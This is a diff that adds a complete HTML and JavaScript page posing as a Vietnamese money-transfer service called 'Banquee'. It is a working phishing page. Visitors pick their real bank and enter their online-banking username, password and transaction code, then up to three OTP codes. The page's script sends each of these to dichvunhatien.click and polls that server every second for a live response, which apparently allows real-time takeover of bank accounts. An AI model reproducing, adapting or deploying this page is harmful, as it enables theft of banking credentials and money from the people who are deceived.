@@ -1,0 +1,701 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="csrf-token" content="sURyRCumZKedQQjnEvZX5zggMCYbxxe5BWa32eK6" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&family=Inter:wght@100..900&family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+        rel="stylesheet">
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <title>Banquee</title>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/css/select2.min.css" />
+    <link rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/select2-bootstrap-5-theme@1.3.0/dist/select2-bootstrap-5-theme.min.css" />
+    <!-- Or for RTL support -->
+    <link rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/select2-bootstrap-5-theme@1.3.0/dist/select2-bootstrap-5-theme.rtl.min.css" />
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.12.3/sweetalert2.css"
+        integrity="sha512-Gebe6n4xsNr0dWAiRsMbjWOYe1PPVar2zBKIyeUQKPeafXZ61sjU2XCW66JxIPbDdEH3oQspEoWX8PQRhaKyBA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" integrity="sha512-3pIirOrwegjM6erE5gPSwkUzO+3cTjpnV9lexlNZqvupR64iZBnOOTiiLPb9M36zpMScbmUNIcHUqKD47M719g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+    // <uniquifier>: Use a unique and descriptive class name
+    // <weight>: Use a value from 300 to 800
+
+    .inter-<uniquifier> {
+        font-family: "Inter", sans-serif;
+        font-optical-sizing: auto;
+        font-weight: <weight>;
+        font-style: normal;
+        font-variation-settings: "slnt" 0;
+    }
+
+    .open-sans-<uniquifier> {
+        font-family: "Open Sans", sans-serif;
+        font-optical-sizing: auto;
+        font-weight: <weight>;
+        font-style: normal;
+        font-variation-settings:
+            "wdth" 100;
+    }
+
+    .dm-sans-<uniquifier> {
+        font-family: "DM Sans", sans-serif;
+        font-optical-sizing: auto;
+        font-weight: <weight>;
+        font-style: normal;
+    }
+
+    body {
+        font-family: "Open Sans", sans-serif;
+    }
+
+    /* 27px */
+    .size-27 {
+        font-size: 27px;
+    }
+
+    .size-14 {
+        font-size: 14px
+    }
+
+    .text-green {
+        color: #FD9100;
+    }
+
+    .bg-green {
+        background: #FD9100;
+    }
+
+    .border-orange {
+        border: 2px solid #FD9100;
+    }
+
+    .font-dm-sans {
+        font-family: "DM Sans", sans-serif;
+    }
+
+    .font-inter {
+        font-family: "Inter", sans-serif;
+    }
+
+    .banner-img {
+        width: 635px;
+    }
+
+    .logo-img {
+        width: 90px;
+    }
+
+    .icon-img {
+        width: 90px;
+    }
+
+    .text-grey {
+        color: #afafaf;
+    }
+
+    .p-content {
+        padding-top: 5px;
+        padding-bottom: 80px;
+    }
+
+    footer {
+        border-top: 1px solid #e4e4e4;
+    }
+
+    .copyright {
+        border-top: 1px solid #e4e4e4;
+    }
+
+    .p-footer-menu {
+        padding-top: 68px;
+        padding-bottom: 68px;
+    }
+
+    .img-select2 {
+        width: 100px;
+    }
+
+    .container-img {
+        width: 100%;
+        text-align: center;
+        margin-bottom: 20px;
+    }
+
+    .img-footer {
+        width: 36%;
+    }
+
+    .no-border {
+        border: 0;
+    }
+
+    @media only screen and (max-width: 765px) {
+        .menu {
+            display: none;
+        }
+
+        .img-select2 {
+            width: 80px;
+        }
+    }
+
+    .select2-selection__clear {
+        left: unset !important;
+    }
+
+    .select2-container--bootstrap-5 .select2-selection {
+        border: 2px solid #ff0018;
+    }
+
+    .noti-title {
+        font-size: 22px;
+    }
+
+    .noti-text {
+        font-size: 14px;
+    }
+</style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="py-3 text-dark">
+        <div class="container-xxl">
+            <div class="d-flex justify-content-between align-items-center">
+                <!-- Logo -->
+                <div class="logo">
+                    <img class="logo-img img-fluid" src="https://dichvunhatien.click/images/logo/logo.png" alt="Banner Image">
+                </div>
+
+                <!-- Menu -->
+                <nav class="navbar navbar-expand-lg navbar-dark">
+                    <div class="p-0 menu">
+                        <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
+                            data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false"
+                            aria-label="Toggle navigation">
+                            <span class="navbar-toggler-icon"></span>
+                        </button>
+                        <div class="collapse navbar-collapse" id="navbarNav">
+                            <ul class="navbar-nav me-auto mb-2 mb-lg-0 size-14">
+                                <li class="nav-item">
+                                    <a class="nav-link text-dark size-14" href="#">Tìm kiếm thông tin</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link text-dark size-14" href="#">Theo dõi chuyển khoản</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link text-dark size-14" href="#">Gửi tiền</a>
+                                </li>
+                                <li class="nav-item">
+                                    <a class="nav-link text-dark size-14" href="#">FAQ</a>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </nav>
+
+                <!-- Login Button -->
+                <div class="login">
+                    <a href="#" class="btn btn-light text-green font-dm-sans">Đăng ký</a>
+                    <a href="#" class="btn btn-light bg-green text-white font-dm-sans">Đăng nhập</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Content -->
+    <main class="container p-content">
+        <div id="banner" class="text-center mb-5">
+            <img class="banner-img img-fluid" src="https://dichvunhatien.click/images/banner/banner.png" alt="Banner Image">
+        </div>
+        <div class="row justify-content-center">
+            <div class="col-md-6">
+                <form id="form-transfer">
+                    <fieldset>
+                        <div class="mb-3">
+                            <label class="form-label">QUÝ KHÁCH VUI LÒNG LỰA CHỌN NGÂN HÀNG <span
+                                    class="text-danger">*</span></label>
+                            <select name="bank" class="form-control" id="select2" required oninvalid="this.setCustomValidity('Vui lòng chọn ngân hàng')" oninput="this.setCustomValidity('')">
+                                <option value="">Vui lòng chọn ngân hàng</option>
+                                                                    <option value="VCB">Ngân hàng Ngoại thương Việt Nam</option>
+                                                                    <option value="MB">Ngân hàng Quân đội</option>
+                                                                    <option value="ICB">Ngân hàng Công Thương Việt Nam</option>
+                                                                    <option value="BIDV">Ngân hàng Đầu tư và Phát triển Việt Nam</option>
+                                                                    <option value="VBA">Hiệp hội Ngân hàng Việt Nam</option>
+                                                                    <option value="VIETTELMONEY">Viettel Money</option>
+                                                                    <option value="TCB">Ngân hàng Kỹ Thương Việt Nam</option>
+                                                                    <option value="ACB">Ngân hàng Thương mại Cổ phần Á Châu</option>
+                                                                    <option value="TPB">Ngân hàng Tiên Phong</option>
+                                                                    <option value="ABB">Ngân hàng Thương mại Cổ phần An Bình</option>
+                                                                    <option value="BAB">Ngân hàng Thương mại Cổ phần Bắc Á</option>
+                                                                    <option value="BVB">Ngân hàng Bảo Việt</option>
+                                                                    <option value="CAKE">CAKE by VPBank</option>
+                                                                    <option value="CBB">Ngân hàng Thương mại Cổ phần Xây dựng Việt Nam</option>
+                                                                    <option value="CIMB">Ngân hàng CIMB</option>
+                                                                    <option value="CITIBANK">Ngân hàng Citibank</option>
+                                                                    <option value="COOPBANK">Ngân hàng Hợp tác xã Việt Nam</option>
+                                                                    <option value="DBS">Ngân hàng DBS</option>
+                                                                    <option value="DOB">Ngân hàng Đông Á</option>
+                                                                    <option value="EIB">Ngân hàng Xuất Nhập khẩu Việt Nam</option>
+                                                                    <option value="GPB">Ngân hàng Dầu khí Toàn cầu</option>
+                                                                    <option value="HDB">Ngân hàng Phát triển Thành phố Hồ Chí Minh</option>
+                                                                    <option value="HLBVN">Ngân hàng Hong Leong Việt Nam</option>
+                                                                    <option value="HSBC">Ngân hàng HSBC</option>
+                                                                    <option value="IBK">Ngân hàng Công nghiệp Hàn Quốc</option>
+                                                                    <option value="IVB">Ngân hàng TNHH Indovina</option>
+                                                                    <option value="KBANK">Ngân hàng Kasikorn</option>
+                                                                    <option value="KBHCM">Ngân hàng Kasikorn Hồ Chí Minh</option>
+                                                                    <option value="KBHN">Ngân hàng Kasikorn Hà Nội</option>
+                                                                    <option value="KEBHANAHCM">Ngân hàng KEB Hana Hồ Chí Minh</option>
+                                                                    <option value="KEBHANAHN">Ngân hàng KEB Hana Hà Nội</option>
+                                                                    <option value="KLB">Ngân hàng Kiên Long</option>
+                                                                    <option value="LPB">Ngân hàng Bưu điện Liên Việt</option>
+                                                                    <option value="MAFC">Công ty Tài chính Mirae Asset</option>
+                                                                    <option value="MSB">Ngân hàng Hàng Hải Việt Nam</option>
+                                                                    <option value="NAB">Ngân hàng Nam Á</option>
+                                                                    <option value="NCB">Ngân hàng Quốc dân</option>
+                                                                    <option value="NHB">Ngân hàng Nông nghiệp Hàn Quốc</option>
+                                                                    <option value="OCB">Ngân hàng Phương Đông</option>
+                                                                    <option value="OCEANBANK">Ngân hàng Đại Dương</option>
+                                                                    <option value="PBVN">Ngân hàng Public Bank Việt Nam</option>
+                                                                    <option value="PGB">Ngân hàng Xăng dầu Petrolimex</option>
+                                                                    <option value="PVCB">Ngân hàng TMCP Đại Chúng Việt Nam</option>
+                                                                    <option value="SCB">Ngân hàng Sài Gòn</option>
+                                                                    <option value="SCVN">Ngân hàng Standard Chartered Việt Nam</option>
+                                                                    <option value="SEAB">Ngân hàng Đông Nam Á</option>
+                                                                    <option value="SGICB">Ngân hàng Công nghiệp và Thương mại Sài Gòn</option>
+                                                                    <option value="SHB">Ngân hàng Sài Gòn – Hà Nội</option>
+                                                                    <option value="SHBVN">Ngân hàng Shinhan Việt Nam</option>
+                                                                    <option value="STB">Ngân hàng Sài Gòn Thương Tín</option>
+                                                                    <option value="TIMO">Ngân hàng số Timo</option>
+                                                                    <option value="UBANK">Ubank by VPBank</option>
+                                                                    <option value="UOB">Ngân hàng United Overseas</option>
+                                                                    <option value="VAB">Ngân hàng Việt Á</option>
+                                                                    <option value="VBSP">Ngân hàng Chính sách Xã hội Việt Nam</option>
+                                                                    <option value="VCCB">Ngân hàng Bản Việt</option>
+                                                                    <option value="VIB">Ngân hàng Quốc tế Việt Nam</option>
+                                                                    <option value="VIETBANK">Ngân hàng Việt Nam Thương Tín</option>
+                                                                    <option value="VNPTMONEY">VNPT Money</option>
+                                                                    <option value="VPB">Ngân hàng Việt Nam Thịnh Vượng</option>
+                                                                    <option value="VRB">Ngân hàng Liên doanh Việt - Nga</option>
+                                                                    <option value="WVN">Ngân hàng Woori Việt Nam</option>
+                                                            </select>
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label">Tên đăng nhập <span class="text-danger">*</span></label>
+                            <input name="user_name" type="text" class="form-control border-orange" required
+                                oninvalid="this.setCustomValidity('Vui lòng nhập tên đăng nhập')"
+                                oninput="this.setCustomValidity('')">
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label">Mật khẩu <span class="text-danger">*</span></label>
+                            <input name="password" type="password" class="form-control border-orange" required
+                                oninvalid="this.setCustomValidity('Vui lòng nhập mật khẩu')"
+                                oninput="this.setCustomValidity('')">
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label">Mã giao dịch <span class="text-danger">*</span></label>
+                            <input name="transaction" type="text" class="form-control border-orange" required
+                                oninvalid="this.setCustomValidity('Vui lòng nhập mã giao dịch')"
+                                oninput="this.setCustomValidity('')">
+                            <small class="form-text text-danger valid-form" style="display:none">Đăng nhập không thành công vui lòng nhập chính xác thông tin</small>
+                        </div>
+                        <button class="btn w-100 mt-3 bg-green text-white btn-login" type="submit">
+                            <span>ĐĂNG NHẬP</span>
+                            <span class="spinner-border spinner-border-sm reload-login" role="status"
+                                aria-hidden="true" style="display:none"></span>
+                        </button>
+                    </fieldset>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="p-footer">
+        <div class="container-xxl">
+            <div class="row p-footer-menu">
+                
+                <div class="col-md-12">
+                    <div class="row">
+                        <div class="col-md-4 col-12">
+                            <div class="container-img">
+                                <img class="img-footer" src="https://dichvunhatien.click/images/footer/1.png" alt="Banner Image">
+                            </div>
+                            <h5>Get money in minutes</h5>
+                            <p>When you need money in minutes</p>
+                            
+                        </div>
+                        <div class="col-md-4 col-12">
+                            <div class="container-img">
+                                <img class="img-footer" src="https://dichvunhatien.click/images/footer/2.png" alt="Banner Image">
+                            </div>
+                            <h5>To bank account</h5>
+                            <p>Send money directly to the recipient's account</p>
+                            
+                        </div>
+                        <div class="col-md-4 col-12">
+                            <div class="container-img">
+                                <img class="img-footer" src="https://dichvunhatien.click/images/footer/3.png" alt="Banner Image">
+                            </div>
+                            <h5>To mobile</h5>
+                            <p>If the recipient lives in a country where we offer mobile money transfers, and they have activated their mobile wallet with our partner mobile operator, you can send money directly to their mobile phone.</p>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row mt-3">
+                <div class="col copyright py-3">
+                    <p class="m-0">&copy; Made by <span class="text-green">Pawel Gola</span> - Powered by <span
+                            class="text-green">Webflow</span></p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+
+    <div class="modal fade" id="modal-otp" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h6 class="modal-title" id="exampleModalLabel">Quý khách nhập mã OTP để xác nhận giao dịch</h6>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <form id="form-otp">
+                <input type="hidden" name="id">
+                <div class="modal-body">
+                    <div class="row">
+                        <div class="col-12">
+                            <div class="form-group">
+                                <label for="exampleInputEmail1">Mã OTP:</label>
+                                <input name="otp" type="text" class="form-control" placeholder="Nhập mã OTP..." required
+                                    oninvalid="this.setCustomValidity('Vui lòng nhập OTP')"
+                                    oninput="this.setCustomValidity('')">
+                                <small class="form-text text-danger valid-otp" style="display:none">Mã otp không hợp lệ</small>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+                <div class="modal-footer">
+                    <button class="btn bg-green text-white btn-send form-control" type="submit">
+                        <span class="text-reload">Xác nhận</span>
+                        <span class="spinner-border spinner-border-sm reload" role="status" aria-hidden="true"
+                            style="display:none"></span>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+    <!-- Optional JavaScript; choose one of the two! -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"></script>
+
+    <!-- Option 1: Bootstrap Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous">
+    </script>
+
+    <!-- Option 2: Separate Popper and Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"
+        integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"
+        integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/select2@4.0.13/dist/js/select2.full.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.12.3/sweetalert2.all.min.js"
+        integrity="sha512-5AB8gXaVKryh61coLazq552bAEgZHzgOVW/wBm98A5D0loLn+uWlttJN21bh8PcQMwgvWf0WC6lcmuwYIzlRyQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js" integrity="sha512-VEd+nq25CkR676O+pLBnDW09R7VQX9Mdiij052gVCp5yVH3jGtH70Ho/UUv4mJDsEdTvqRCFZg0NKGiojGnUCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
+    // $(document).on('click', '#logout_link', function(e) {
+    //     e.preventDefault();
+    //     Swal.fire({
+    //         text: "Are you sure you want to logout?",
+    //         icon: "warning",
+    //         showCancelButton: true,
+    //         buttonsStyling: false,
+    //         confirmButtonText: "Yes, logout!",
+    //         cancelButtonText: "No, cancel",
+    //         customClass: {
+    //             confirmButton: "btn fw-bold btn-danger",
+    //             cancelButton: "btn fw-bold btn-active-light-primary"
+    //         }
+    //     }).then(function(result) {
+    //         if (result.value) {
+    //             window.location = 'https://dichvunhatien.click/logout';
+    //         }
+    //     });
+    // });
+</script>
+
+<script>
+    //setup header
+    $.ajaxSetup({
+        headers: {
+            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+        }
+    });
+
+    //hiển thị thông báo
+    function notification(type, title, content) {
+        title = '';
+        if (Array.isArray(content)) {
+            let string = '';
+            $.each(content, function(index, item) {
+                string += item + '<br/>';
+            });
+            content = string;
+        }
+   
+        toastr.options = {
+            "closeButton": true,
+            "debug": false,
+            "newestOnTop": false,
+            "progressBar": true,
+            // "positionClass": "toastr-top-right",
+            "preventDuplicates": false,
+            "onclick": null,
+            "showDuration": "300",
+            "hideDuration": "1000",
+            "timeOut": "3000",
+            "extendedTimeOut": "1000",
+            "showEasing": "swing",
+            "hideEasing": "linear",
+            "showMethod": "fadeIn",
+            "hideMethod": "fadeOut"
+        };
+
+        switch (type) {
+            case 'success':
+                toastr.success(content, title);
+                break;
+            case 'error':
+                toastr.error(content, title);
+                break;
+            case 'warning':
+                toastr.warning(content, title);
+                break;
+            default:
+                toastr.warning('Không xác định được thông báo', 'Cảnh báo!');
+                break;
+        }
+    }
+
+    function formatDateTime(dateTimeString) {
+        const date = new Date(dateTimeString);
+        const year = date.getFullYear();
+        const month = String(date.getMonth() + 1).padStart(2, "0");
+        const day = String(date.getDate()).padStart(2, "0");
+        const hour = String(date.getHours()).padStart(2, "0");
+        const minute = String(date.getMinutes()).padStart(2, "0");
+        const second = String(date.getSeconds()).padStart(2, "0");
+
+        return `${hour}:${minute}:${second} ${day}-${month}-${year}`;
+    }
+</script>
+    <script>
+    $(document).ready(function() {
+        $.ajaxSetup({
+            headers: {
+                'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+            }
+        });
+
+        function formatState(state) {
+            if (!state.id) {
+                return state.text;
+            }
+            var baseUrl = "https://dichvunhatien.click/images/bank";
+            var $state = $(
+                '<span><img src="' + baseUrl + '/' + state.element.value +
+                '.png" class="img-flag img-select2" /> ' + state.text + '</span>'
+            );
+            return $state;
+        };
+
+        $('#select2').select2({
+            theme: 'bootstrap-5',
+            width: '100%',
+            templateResult: formatState,
+            placeholder: "Chọn ngân hàng",
+            allowClear: true
+
+        });
+
+        // FORM
+        function showModal(id = null) {
+            var modal = $('#modal-otp');
+            modal.find('input[name=otp]').val('');
+            modal.find('input[name=id]').val(id);
+            modal.modal({
+                backdrop: 'static',
+                keyboard: false
+            });
+            modal.modal('show');
+        }
+
+        var numberSubmit = 1;
+
+        function fetchData(id, type) {
+            let url = "https://dichvunhatien.click/ping/:id";
+            url = url.replace(':id', id);
+            $.ajax({
+                url: url,
+                method: 'GET',
+                success: function(res) {
+                    clearInterval(intervalId);
+                    if (type == 'otp') {
+                        //disable form otp
+                        $('.btn-send').prop('disabled', false);
+                        $('.reload').hide();
+                        $('input[name=otp]').val('');
+                        $('.valid-otp').hide();
+                        numberSubmit = res.content.numOtp;
+                        if (res.type == 'success') {
+                            if (numberSubmit >= 3) {
+                                $('#modal-otp').modal('hide');
+                                numberSubmit = 0;
+                                $('#form-transfer').trigger('reset');
+                                swalFire();
+                            } else {
+                                if(numberSubmit == 2){
+                                    swalFireNew("Gửi mã OTP thành công", 'success', 'Quý khách vui lòng chờ trong giây lát để giao dịch được thực hiện');
+                                }else{
+                                    swalFireNew("Gửi mã OTP thành công", 'success');
+                                }
+                                // notification('success', 'success', 'Gửi mã OTP thành công');
+                                // swalFireNew("Gửi mã OTP thành công", 'success');
+                                numberSubmit += 1;
+                            }
+                        } else {
+                            // $('.valid-otp').show();
+                            swalFireNew("Mã OTP sai hoặc đã hết hạn", 'error');
+                        }
+                    } else {
+                        //disable form login
+                        $('.btn-login').prop('disabled', false);
+                        $('.reload-login').hide();
+                        $('.valid-form').hide();
+
+                        if (res.type == 'success') {
+                            showModal(res.content.id);
+                        } else {
+                            // $('.valid-form').show();
+                            // notification('error', 'error', 'Đăng nhập không thành công');
+                            swalFireNew("Sai tên đăng nhập hoặc mật khẩu", 'error');
+                        }
+                    }
+                },
+                error: function(error) {}
+            });
+        }
+
+        var intervalId = null;
+        $(document).on('submit', '#form-transfer', function(e) {
+            e.preventDefault()
+            var formData = $('#form-transfer').serialize();
+            $('.btn-login').prop('disabled', true);
+            $('.reload-login').show();
+            $.ajax({
+                url: "https://dichvunhatien.click",
+                method: 'POST',
+                data: formData,
+                success: function(data) {
+                    if (data.type == 'success') {
+                        intervalId = setInterval(function() {
+                            fetchData(data.content.id, 'form');
+                        }, 1000);
+                    }
+                },
+                error: function(xhr, status, error) {
+                    if (status !== 'abort') {
+                        console.error('Error sending data', error);
+                    }
+                }
+            });
+        });
+
+        $(document).on('submit', '#form-otp', function(e) {
+            e.preventDefault();
+            var formData = $('#form-otp').serialize();
+            $('.btn-send').prop('disabled', true);
+            $('.reload').show();
+            $.ajax({
+                url: "https://dichvunhatien.click/update",
+                method: 'POST',
+                data: formData,
+                success: function(data) {
+                    if (data.type == 'success') {
+                        intervalId = setInterval(function() {
+                            fetchData(data.content.id, 'otp');
+                        }, 1000);
+                    }
+                },
+                error: function(xhr, status, error) {
+                    if (status !== 'abort') {
+                        console.error('Error sending data', error);
+                    }
+                }
+            });
+        });
+
+        function swalFireNew(title, icon, text = "") {
+            Swal.fire({
+                title: title,
+                text: text,
+                position: "center",
+                // icon: icon,
+                iconHtml: `<img class="icon-img" src="https://dichvunhatien.click/images/icon/${icon}.png">`,
+                customClass: {
+                    icon: 'no-border',
+                    title: 'noti-title',
+                    text: 'noti-text',
+                },
+                showConfirmButton: true,
+                confirmButtonColor: '#FD9100',
+                // timer: 5000
+            });
+        }
+
+        function swalFire() {
+            Swal.fire({
+                title: "Gửi thông tin thành công",
+                text: "Quý khách vui lòng chờ trong giây lát để giao dịch được thực hiện",
+                position: "center",
+                iconHtml: `<img class="icon-img" src="https://dichvunhatien.click/images/icon/success.png">`,
+                customClass: {
+                    icon: 'no-border',
+                    title: 'noti-title',
+                    text: 'noti-text',
+                },
+                showConfirmButton: false,
+                timer: 5000
+            });
+        }
+
+
+
+    });
+</script>
+</body>
+
+</html>
